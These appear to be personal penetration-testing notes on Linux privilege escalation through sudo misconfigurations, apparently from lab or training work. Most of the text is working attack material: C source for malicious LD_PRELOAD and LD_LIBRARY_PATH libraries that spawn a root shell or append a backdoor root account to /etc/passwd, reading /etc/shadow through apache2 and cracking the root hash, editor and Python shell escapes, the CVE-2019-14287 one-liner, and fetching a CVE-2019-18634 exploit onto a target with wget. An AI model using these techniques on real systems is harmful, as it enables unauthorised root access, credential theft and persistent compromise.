Look into #PATH-Hijacking! 

#### Sudo bins
```bash - kali
sudo -l
```

```firefox
https://gtfobins.github.io/
```

Search what you're looking for, und "Sudo" section.

#### Text editor
Say we find a tool we can run as sudo, knife in this example.  In the manpage, it describes we can edit in a text editor.

![[Pasted image 20220922105222.png]]

```bash - target
sudo knife data bag create 1 2 -e vi
```

```bash - target
:!/bin/sh
```


#### Sudo shell escaping
```bash - kali
https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
```

#### LD Preload
```bash - kali
sudo -l
```

![[Pasted image 20220215144529.png]]

```bash - kali
nano shell.c
```

```bash - kali
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash - kali
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Now just run the following command with any option from "sudo -l" :
MAKE SURE to use the full path for the shell.so file.

```bash - kali
sudo LD_PRELOAD=/home/user/shell.so apache2
```

```bash 
id
```

#### LD_LIBRARY_PATH
Here we have a elf file on a cron schedule for every minute.  We can write to /usr/local/lib/dev

![[Pasted image 20220318123807.png]]

We go to /usr/bin and try to execute log-sweeper, we find a message:
![[Pasted image 20220318124218.png]]

We can create a malicious utils.c:

```bash - kali
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash' >> /etc/passwd");
}
```

```bash - kali
gcc -fPIC -shared -o utils.so utils.c -nostartfiles
```

Now just put the ustils.so file in the writable LD_LIBRARY_PATH and wait for the cron job to execute.

```bash - kali
su newroot
```

```bash - kali
password
```

#### Apache2

1. List the programs your user is allowed to run via sudo:

```bash
sudo -l
```

 (root) NOPASSWD: /usr/sbin/apache2

Note that apache2 is in the list.

2. apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.

3. Run apache2 using sudo , and provide it the /etc/shadow file as a config file:

```bash
sudo apache2 -f /etc/shadow
```

Syntax error on line 1 of /etc/shadow:

```Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration```

![[Pasted image 20211230153252.png]]

4. Extract the root user’s hash from the file.

5. Save the password hash in a file (e.g. hash.txt):

```echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'```

6. Crack the password hash using john:

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])```

password123 (?)

7. Use the su command to switch to the root user, entering the password we cracked when prompted:

```bash
su
```

```bash
password123
```

```bash
id
```

uid=0(root) gid=0(root) groups=0(root)


#### sudo -l !root

```bash
https://www.exploit-db.com/exploits/47502
```

![[Pasted image 20211230153039.png]]

```bash
sudo -u#-1 /bin/bash
```

![[Pasted image 20211230153054.png]]

#### sudo -l different user
1. List the programs your user is allowed to run via sudo:

```bash
sudo -l
```

![[Pasted image 20211230153125.png]]

2. For each program in the list, see if there is a shell escape sequence on GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/))

3. If an escape sequence exists, run the program via sudo and perform the sequence to spawn a root shell.

```bash
sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```


#### CVE 2019-14287
```firefox - kali
https://www.exploit-db.com/exploits/47502
```

```bash - kali
sudo -u#-1 /bin/bash
```

#### CVE-2019-18634
```bash - kali
sudo -V
```

```bash - kali
https://nvd.nist.gov/vuln/detail/CVE-2019-18634
```

```bash - kali
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
```

```bash - kali
https://www.sudo.ws/security/advisories/pwfeedback/
```

```bash - target
wget http://$KALI/exploit.c
```

```bash - target
gcc exploit.c -o exploit
```

```bash - kali
./exploit
```

Hit enter a time or two.
